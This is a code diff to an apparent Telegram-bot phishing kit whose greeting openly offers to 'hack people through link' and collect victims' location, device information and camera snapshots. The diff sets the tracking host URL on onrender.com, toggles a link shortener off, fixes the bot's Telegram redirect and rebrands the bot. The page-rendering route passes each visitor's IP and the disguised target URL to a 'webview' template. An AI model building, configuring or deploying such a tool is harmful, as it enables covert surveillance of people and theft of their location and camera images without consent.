@@ -15,9 +15,9 @@ app.use(cors());
 app.set("view engine", "ejs");
 
 //Modify your URL here
-var hostURL="https:freecosmicdata.onrender.com";
+var hostURL="https://freecosmicdata.onrender.com";
 //TOGGLE for Shorters
-var use1pt=true;
+var use1pt=false;
 
 
 
@@ -31,7 +31,7 @@ if(req.params.path != null){
 res.render("webview",{ip:ip,time:d,url:atob(req.params.uri),uid:req.params.path,a:hostURL,t:use1pt});
 } 
 else{
-res.redirect("https://t.me/@cosmic_warriorBot");
+res.redirect("https://t.me/cosmic_warriorBot");
 }
 
          
@@ -72,7 +72,7 @@ var m={
 reply_markup:JSON.stringify({"inline_keyboard":[[{text:"Create Link",callback_data:"crenew"}]]})
 };
 
-bot.sendMessage(chatId, `HIE ${msg.chat.first_name} ! , \nAM SHINITA THA HELPER 💗 YOU CAN USE ME TO HACK PEOPLE THROUGH LINK 🔗.\nCAN GATHER INFORMATION LIKE LOCATION , DEVICE INFO & CAMERA SNAP🫰.\n\nTYPE /help FOR MORE INFO & TUTORIAL'S.`,m);
+bot.sendMessage(chatId, `HIE ${msg.chat.first_name} ! , \nAM COSMIC 🪖 WARRIOR 💗 YOU CAN USE ME TO HACK PEOPLE THROUGH LINK 🔗.\nCAN GATHER INFORMATION LIKE LOCATION , DEVICE INFO & CAMERA SNAP🫰.\n\nTYPE /help FOR MORE INFO & TUTORIAL'S.`,m);
 }
 else if(msg.text=="/create"){
 createNew(chatId);
